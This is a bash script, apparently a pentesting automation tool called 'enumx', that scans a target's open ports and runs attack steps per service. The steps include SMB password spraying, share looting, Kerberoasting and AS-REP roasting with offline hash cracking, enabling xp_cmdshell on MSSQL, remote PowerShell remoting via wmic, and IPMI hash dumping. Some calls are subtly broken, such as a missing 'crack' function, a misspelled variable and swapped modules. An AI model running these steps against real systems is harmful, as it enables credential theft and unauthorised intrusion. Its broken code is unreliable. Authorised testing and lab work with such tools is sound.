#!/bin/bash
cat << "EOF"
                                         /\__     __/\
 ________ __   __   __    __   ___  ___  \   \   /   / 
|   ____/|  \ |  | |  |  |  | |   \/   |  \   \ /   / 
|  |___  |   \|  | |  |  |  | |  \  /  |   \   V   /
|   __/  |  . `  | |  |  |  | |  |\/|  |    >     <
|  |_____|  |\   | |  `--'  | |  |  |  |   /   .   \
|_______/|__| \__|  \______/  |__|  |__|  /   / \   \ 
                                         / __/   \__ \
  Version: 2.1     Author: DaddyBigFish  \/         \/  
 --------------   ----------------------    
EOF
# Required tools to be pre-installed:
#  cups curl dnsutils git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl
#  mariadb-server metasploit-framework nano nbtscan netcat-openbsd nfs-common nmap
#  odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind
#  smbclient tree wafw00f whatweb wordlists

# Usage information
if [ -z "$1" ]; then
    echo "  Examples:"
    echo "    enumx <TARGET>                - Run enumeration on the specified target."
    echo "    enumx <TARGET> creds          - Run enumeration on the specified target using specific usernames and passwords."
    echo "    enumx <TARGET> crack [--crack-time <SECONDS>] - Attempt to quickly crack each hash within specified seconds (default: 15)."
    echo "    enumx update                  - Update to the latest version of enumx."
    echo "    enumx install                 - Install the pre-required tools for enumx (Kali Linux / Debian)."
    exit 1
fi
# Update to latest version
if [[ "$1" == "update" ]]; then
    echo '     Updating to latest version...'
    rm -rf /tmp/.git/enumx 2>/dev/null
    git clone https://github.com/DaddyBigFish/enumx.git /tmp/.git/enumx 2>/dev/null
    chmod +x /tmp/.git/enumx/enumx 2>/dev/null
    sudo ln -s /tmp/.git/enumx/enumx /usr/local/bin/enumx 2>/dev/null
    echo '     Update complete.'
    exit 1
fi
# Install the pre-required tools for enumx (Kali Linux / Debian)
if [[ "$1" == "install" ]]; then
    echo 'Installing pre-required tools for enumx (Kali Linux / Debian)...'
    sudo apt install -y cups curl dnsutils git influxdb inetutils-ftp john ldap-utils libimage-exiftool-perl mariadb-server metasploit-framework nano nbtscan netcat-openbsd nfs-common nmap odat openssh-client openssl postgresql postgresql-contrib python3-impacket rpcbind smbclient tree wafw00f whatweb wordlists
    gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null
    echo 'Install complete.'
    exit 1
fi

target=$1
action=$2
shift 2  # Shift past the first two arguments

# Create the enumx working directory
enumx_dir="/tmp/enumx/$target"
mkdir -p "$enumx_dir"

# Create files for storing found data such as usernames, passwords, hashes, creds and more
touch "$enumx_dir"/usernames
if [ ! -s "$enumx_dir/usernames" ]; then
    echo "" >> "$enumx_dir/usernames"
    echo "guest" >> "$enumx_dir/usernames"
fi
sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
touch "$enumx_dir"/passwords
if [ ! -s "$enumx_dir/passwords" ]; then
    echo "" >> "$enumx_dir/passwords"
fi
sort -u "$enumx_dir"/passwords -o "$enumx_dir"/passwords 2>/dev/null
touch "$enumx_dir"/hashes
sort -u "$enumx_dir"/hashes -o "$enumx_dir"/hashes 2>/dev/null
touch "$enumx_dir"/creds
sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
touch "$enumx_dir"/domains
sort -u "$enumx_dir"/domains -o "$enumx_dir"/domains 2>/dev/null

# Enter usernames and passwords if creds parameter is selected
if [[ "$action" == "creds" ]]; then
  nano "$enumx_dir"/usernames
  nano "$enumx_dir"/passwords
  nano "$enumx_dir"/creds
  using_creds=true
fi
# Attempt to quickly crack each hash within 15 seconds.
crack_hashes() {
    local hash_time=15  # Default hash cracking time

    # Parse optional flags
    while [[ "$#" -gt 0 ]]; do
        case "$1" in
            --crack-time)
                if [[ -n "$2" && "$2" =~ ^[0-9]+$ ]]; then
                    hash_time="$2"
                    shift 2
                else
                    echo "Error: --crack-time requires a numeric argument."
                    exit 1
                fi
                ;;
            *)
                echo "Unknown option: $1"
                exit 1
                ;;
        esac
    done

    echo "Attempting to crack each hash within $hash_time seconds..."
    for hash in $(cat "$enumx_dir"/hashes); do
        echo "$hash" > "$enumx_dir"/.hash
        john "$enumx_dir"/.hash -w=/usr/share/wordlists/rockyou.txt --max-run-time="$hash_time" --pot="$enumx_dir"/john.pot 2>/dev/null | grep -viE 'loaded|FAQ'
    done
    echo 'Cracking attempt completed.'
    echo
    echo 'Hashes that have been cracked:'
    cracked=$(john "$enumx_dir"/.hash --pot="$enumx_dir"/john.pot --show 2>/dev/null | sed '$d')
    echo "$cracked" | sed -E 's/.*:()/\1/' | tee -a "$enumx_dir"/passwords
}

# Attempt to quickly crack each hash
if [[ "$action" == "crack" ]]; then
    crack_hashes "$@"
    exit 1
fi

rm "$enumx_dir/.hashes" 2>/dev/null

# Scan for open ports using nmap
open_ports=$(nmap --open --min-rate 10000 "$target" | awk '{print $1}' | grep '/' | sed 's#/.*##' | sort -n)

# By default commands are taken from book.hacktricks.xyz plus added to by community updates
# Test each open port using pentesting techniques.
for port in $open_ports; do
    echo -e "\n━━━━━━━━━━━━━━━━━━━━━━━━━ PORT: $port"
    case $port in
        7)
            # https://book.hacktricks.xyz/network-services-pentesting/7-tcp-udp-pentesting-echo
            nc -uvn "$target" 7
            ;;
        21)
            # https://www.netexec.wiki/ftp-protocol/file-listing-etc
            nxc ftp "$target" -u 'anonymous' -p 'anonymous' --ls
            mkdir -p "$enumx_dir"/ftp
            for x in $(curl -s -u anonymous:anonymous -l ftp://"$target" 2>/dev/null)
            do curl -s -u anonymous:anonymous -o "$enumx_dir/ftp/$x" ftp://"$target/$x" 2>/dev/null
            done
            echo
            echo -e "Authors / Creators of files found:"
            exiftool "$enumx_dir"/ftp/* | grep -v 'Tool' | grep -E 'Author|Creator' | awk '{print $3}' | sort -u
            ;;
        22)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh
            ssh-keyscan -t rsa "$target" -p"$port"
            ;;
        23)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-telnet
            nmap -n -sV -Pn --script "*telnet* and safe" -p"$port" "$target"
            ;;
        25)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
            nmap -p"$port" --script smtp-open-relay "$target" -v
            ;;
        53)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
            dig axfr @"$target" +timeout=1 | sed '1d'
            ;;
        79)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-finger
            msfconsole -q -x "use auxiliary/scanner/finger/finger_users; set RHOSTS $target; run; exit"
            ;;
        80)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-web
            whatweb "http://$target:$port"
            echo
            curl -Iks "http://$target:$port" 2>/dev/null
            wafw00f "http://$target:$port" 2>/dev/null
            ;;
        88)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
            nmap $target -p"$port" --host-timeout 3s --min-rate 10000 | grep -vE 'Nmap|latency|nmap' | sed '1d'
            if [ -s "$enumx_dir/domains" ]; then
                for domain in $(cat "$enumx_dir/domains"); do
                    hash=$(PYTHONWARNINGS="ignore" impacket-GetNPUsers -usersfile "$enumx_dir/usernames" "$domain"/ -dc-ip "$target" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes")
                    user=$(echo "$hash" | sed -E 's/([^$]*\$){3}([^@]*)@.*/\2/')
                    PYTHONWARNINGS="ignore" impacket-GetUserSPNs -no-preauth "$user" -usersfile "$enumx_dir/usernames" -dc-host "$target" "$domain"/ | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes"
                done
                for domain in $(cat "$enumx_dir/domains"); do
                    for cred in $(cat "$enumx_dir/creds"); do
                    	if [[ ! "$cred" =~ ^(:|[Gg]uest:)$ ]]; then
	                        PYTHONWARNINGS="ignore" impacket-GetUserSPNs -request -dc-ip "$target" "$domain"/"$cred" | grep -iE '\$krb' 2>/dev/null | tee -a "$enumx_dir/hashes" | tee -a "$enumx_dir/.hashes"
	                    fi
                    done
                done
            fi
            if [ -s "$enumx_dir/.hashes" ]; then
            	crack
           	fi
            ;;
        110)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
            nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p"$port" "$target"
            ;;
        111)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-rpcbind
            rpcinfo -p "$target"
            nmap -sSUC -p"$port" "$target"
            ;;
        113)
            # https://book.hacktricks.xyz/network-services-pentesting/113-pentesting-ident
            nmap "$target" -sC
            ;;
        135)
            # https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
            impacket-rpcdump -p "$port" "$target" | grep -E 'Protocol|Provider' | grep -vE 'N/A|Interface' | awk '{print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20}' | grep -E 'Remote'
            ;;
        139)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
            echo "Enumerating port $port can take some time please wait..."
            mkdir -p "$enumx_dir"/smb 2>/dev/null
          	if [ "$using_creds" == true ]; then
          		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
          		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
  		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
	           	for cred in $(cat "$enumx_dir"/creds); do
	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
   		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
   		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                    list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                    echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
 	            	echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
 	                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | sed -E '1d'
 	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
 	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
 	                for share in "${list_shares[@]}"; do
 	                    echo "Authenticating as $credu:$credp on share $share..."
 	                    smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
 	                done
   		        done
            else
                default_usernames=("guest" "")
                for user in "${default_usernames[@]}"
                do
                shares=$(nxc smb "$target" --port "$port" -u "$user" -p '' --shares)
                groups=$(nxc smb "$target" --port "$port" -u "$user" -p '' --groups)
                ridbrute=$(nxc smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
                list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
                done
                for share in "${list_shares[@]}"; do
                    smbclient "//$target/$share" -U '' --no-pass -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
	        done
	    fi
            tree "$enumx_dir"/smb 2>/dev/null
            find "$enumx_dir"/smb -type f 2>/dev/null
            echo
            nbtscan "$target"/24
            ;;
        143)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap
            nmap -sV --script imap-brute -p "$port" "$target"
            ;;
        389)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
            ldapsearch -H "ldap://$target" -x -s base dnshostname | grep -i 'dnshostname' | awk '{print $2}' | grep -vi 'requesting:' | tee -a "$enumx_dir/domains"
            echo
            ldapsearch -H "ldap://$target" -x -s base namingcontexts | grep -i 'namingcontexts' | awk '{print $2}' | grep -vi 'requesting:'
            nmap --script "ldap* and not brute" -p "$port" "$target" | grep -Ei 'uid:|NTPassword' | awk '{print $3}'
            nmap --script "ldap* and not brute" -p "$port" "$target" | grep -viE 'Nmap|latency|supported' 
            ;;
        443)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-web          
            whatweb "https://$target:$port"
            echo
            curl -Iks "https://$target:$port" 2>/dev/null
            echo
            echo | openssl s_client -connect "$target:$port" -servername "$target" 2>/dev/null | openssl x509 -text | grep 'CN=' | awk -F 'CN=|,' '{print $2}' | grep -viE 'DC|-'
            echo | openssl s_client -connect "$target:$port" -servername "$target" 2>/dev/null | openssl x509 -outform PEM
            wafw00f "https://$target:$port" 2>/dev/null
            ;;
        445)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
            echo "Enumerating port $port can take some time please wait..."
            mkdir -p "$enumx_dir"/smb 2>/dev/null
          	if [ "$using_creds" == true ]; then
          		spray=$(nxc smb "$target" --port "$port" -u "$enumx_dir/usernames" -p "$enumx_dir/passwords" --continue-on-success | grep -viE '\\:')
          		echo "$spray" | grep -iE '[+]' | awk '{print $6}' | cut -d'\' -f2- | tee -a "$enumx_dir/creds"
  		        sort -u "$enumx_dir"/creds -o "$enumx_dir"/creds 2>/dev/null
	           	for cred in $(cat "$enumx_dir"/creds); do
	           		read credu credp <<< $(echo "$cred" | sed 's/:/ /')
   		            shares=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --shares)
   		            groups=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --groups)
   		            ridbrute=$(nxc smb "$target" --port "$port" -u "$credu" -p "$credp" --rid-brute 10000)
                    list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                    echo "$shares" | grep -iE 'domain:' | sed -E 's/.*domain:([^)]*).*/\1/' | tee -a "$enumx_dir/domains"
 	            	echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]|[-]'
 	                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | sed -E '1d'
 	                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser' | sed -E '1d'
 	                echo "$ridbrute" | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee -a "$enumx_dir/usernames"
 	                sort -u "$enumx_dir"/usernames -o "$enumx_dir"/usernames 2>/dev/null
 	                for share in "${list_shares[@]}"; do
 	                    echo "Authenticating as $credu:$credp on share $share..."
 	                    smbclient "//$target/$share" -U "$credu%$credp" -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
 	                done
   		        done
            else
                default_usernames=("guest" "")
                for user in "${default_usernames[@]}"
                do
                shares=$(nxc smb "$target" --port "$port" -u "$user" -p '' --shares)
                groups=$(nxc smb "$target" --port "$port" -u "$user" -p '' --groups)
                ridbrute=$(nxc smb "$target" --port "$port" -u "$user" -p '' --rid-brute)
                list_shares=($(echo "$shares" | grep -iE 'READ|Write' | awk '{print $5}'))
                echo "$shares" | awk '{printf "%-15s %-15s %-15s %-20s\n",$4,$5,$6,$7" "$8" "$9" "$10}' | grep -vE '[*]'
                echo "$groups" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]'
                echo "$ridbrute" | awk '{printf "%-15s %-15s %-0s %-0s\n",$4,$5,$6,$7,$8,$9,$10}' | grep -vE '[*]|[-]' | grep -E '[+]|SidTypeUser'
                done
                for share in "${list_shares[@]}"; do
                    smbclient "//$target/$share" -U '' --no-pass -c "lcd $enumx_dir/smb; recurse ON; prompt OFF; mget *" >/dev/null 2>&1
	        done
	    fi
            tree "$enumx_dir"/smb 2>/dev/null
            find "$enumx_dir"/smb -type f 2>/dev/null
            echo
            nbtscan "$target"/24
            ;;
        465)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
            nmap -p"$port" --script smtp-open-relay "$target" -v
            ;;
        587)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp
            nmap -p"$port" --script smtp-open-relay "$target" -v
            ;;
        593)
            # https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
            impacket-rpcdump -p "$port" "$target" | grep -Ei 'Protocol|Provider' | grep -vEi 'N/A|Interface' | awk '{print $2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,$20}' | grep -Ei 'Remote'
            ;;
        623)
            # https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
            msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $target; set RPORT "$port"; run; exit"
            ;;
        631)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-631-internet-printing-protocol-ipp
            lpinfo -v "$target"
            ;;
        636)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
            LDAPTLS_REQCERT=never ldapsearch -H "ldaps://$target" -x -s base dnshostname | grep -i 'dnshostname' | awk '{print $2}' | grep -vi 'requesting:'
            echo
            LDAPTLS_REQCERT=never ldapsearch -H "ldaps://$target" -x -s base namingcontexts | grep -i 'namingcontexts' | awk '{print $2}' | grep -vi 'requesting:'
            nmap --script "ldap* and not brute" -p "$port" "$target" | grep -iE 'uid:|NTPassword' | awk '{print $3}'
            nmap --script "ldap* and not brute" -p "$port" "$target" | grep -viE 'Nmap|latency|supported'
            ;;
        993)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap
            nmap -sV --script imap-brute -p "$port" "$target"
            ;;
        995)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop
            nmap --script "pop3-capabilities or pop3-ntlm-info" -sV -p "$port" "$target"
            ;;
        1026)
            # https://book.hacktricks.xyz/network-services-pentesting/1026-pentesting-rusersd
            rusers -l "$target"
            ;;
        1433)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server
            nxc mssql "$target" -u 'anonymous' -p 'anonymous' -q "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;"
            nxc mssql "$target" -u 'anonymous' -p 'anonymous' -x "whoami"
            ;;
        1521)
            # https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
            odat all -s "$target"
            ;;
        1522)
            # https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
            odat all -s "$target"
            ;;
        1529)
            # https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener
            odat all -s "$target"
            ;;
        2049)
            # https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting
            for x in $(showmount -e "$target" | awk '{print $1}' | grep -v 'Export')
            do mkdir -p "$enumx_dir"/mnt"$x"
            sudo mount -t nfs "$target":"$x" "$enumx_dir"/mnt"$x" -o nolock
            tree -puga "$enumx_dir"/mnt"$x"
            done
            ;;
        3306)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-mysql
            mysql -h "$target" -u root@localhost -e 'show databases;'
            ;;
        3389)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-rdp
            nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p "$port" "$target"
            ;;
        5000)
            # https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry
            curl -s http://"$target":"$port"/v2/_catalog
            curl -s -k https://"$target":"$port"/v2/_catalog
            ;;
        5432)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
            psql -h "$target" -p "$port" -d postgres -U postgres
            ;;
        5433)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql
            psql -h "$target" -p "$port" -d postgres -U postgres
            ;;
        5800)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
            nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; set RPORT 5800; run; exit"
            ;;
        5801)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
            nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; set RPORT 5801; run; exit"
            ;;
        5900)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
            nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; set RPORT 5900; run; exit"
            ;;
        5901)
            # https://book.hacktricks.xyz/network-services-pentesting/pentesting-vnc
            nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/vnc/vnc_none_auth; set RHOSTS $target; set RPORT 5901; run; exit"
            ;;
        5984)
            # https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb
            nmap -sV --script couchdb-databases,couchdb-stats -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOSTS $target; set RPORT 5984; run; exit"
            ;;
        5985)
            # https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
            wmic /node:"$target" process call create "powershell enable-psremoting -force"
            ;;
        5986)
            # https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm
            wmic /node:"$target" process call create "powershell enable-psremoting -force"
            ;;
        6000)
            nmap -sV --script x11-access -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS $target; set RPORT $port; run; exit"
            ;;
        6379)
            # https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
            nmap --script redis-info -sV -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/redis/redis_server; set RHOSTS $target; set RPORT $port; run; exit"
            ;;
        6984)
            # https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb
            nmap -sV --script couchdb-databases,couchdb-stats -p "$port" "$target"
            msfconsole -q -x "use auxiliary/scanner/x11/open_x11; set RHOSTS $target; set RPORT $port; run; exit"
            ;;
        8009)
            # https://book.hacktricks.xyz/network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp
            nmap -sV --script ajp-auth,ajp-headers,ajp-methods,ajp-request -n -p "$port" "$target"
            ;;
        8080)
            curl -I http://"$target":"$port"
            ;;
        8086)
            # https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb
            influx -host "$target" -port "$port"
            ;;
        9100)
            # https://book.hacktricks.xyz/network-services-pentesting/9100-pjl
            nc -vn "$target" "$port"
            ;;
        9200)
            # https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch
            curl -X GET "http://$target:$port/"
            curl -X GET "http://$target:$port/_security/role"
            curl -X GET "http://$target:$port/_security/user"
            curl -X GET "http://$target:$port/_security/user/admin"
            ;;
        10000)
            # https://book.hacktricks.xyz/network-services-pentesting/10000-network-data-management-protocol-ndmp
            nmap -n -sV --script "ndmp-fs-info or ndmp-version" -p "$port" "$target"
            ;;
        11211)
            echo "version" | nc -vn -w 1 "$target" "$port"
            echo "stats" | nc -vn -w 1 "$target" "$port"
            echo "stats slabs" | nc -vn -w 1 "$target" "$port"
            echo "stats items" | nc -vn -w 1 "$target" "$port"
            echo "stats cachedump <number> 0" | nc -vn -w 1 "$target" "$port"
            echo "get <item_name>" | nc -vn -w 1 "$target" "$port"
            nmap -n -sV --script memcached-info -p "$port" "$target"
            ;;
        15672)
            legba stomp --target "$target":"$port" --username guest --password guest
            ;;
        27017)
            # https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
            nmap -sV --script "mongo* and default" -p "$port" "$target"
            ;;
        27018)
            # https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb
            nmap -sV --script "mongo* and default" -p "$port" "$targt"
            ;;
        44818)
            # https://book.hacktricks.xyz/network-services-pentesting/44818-ethernetip
            nmap -n -sV --script enip-info -p "$port" "$target"
            ;;
        47808)
            # https://book.hacktricks.xyz/network-services-pentesting/47808-udp-bacnet
            nmap --script bacnet-info --script-args full=yes -sU -n -sV -p "$port" "$target"
            ;;
        *)
            nmap $target -p"$port" --host-timeout 2s -T5 | grep -vE 'Nmap|latency|nmap' | sed '1d'
            ;;
    esac
done
